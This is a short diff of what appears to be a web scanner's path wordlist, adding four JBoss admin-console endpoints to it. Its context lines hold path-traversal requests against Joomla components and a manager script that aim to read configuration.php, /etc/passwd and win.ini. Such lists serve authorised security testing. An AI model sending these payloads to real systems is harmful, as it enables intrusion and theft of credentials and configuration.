@@ -111,3 +111,7 @@
 /index.php?option=com_picsell&controller=prevsell&task=dwnfree&dflink=../../../configuration.php
 /index.php?option=com_jotloader&section=../../../../../../../../../../../../../../etc/passwd%00
 /manager/controllers/default/resource/tvs.php?class_key=../../../../../../../../../../windows/win.ini%00
+/jmx-console/
+/web-console/
+/web-console/ServerInfo.jsp
+/invoker/JMXInvokerServlet
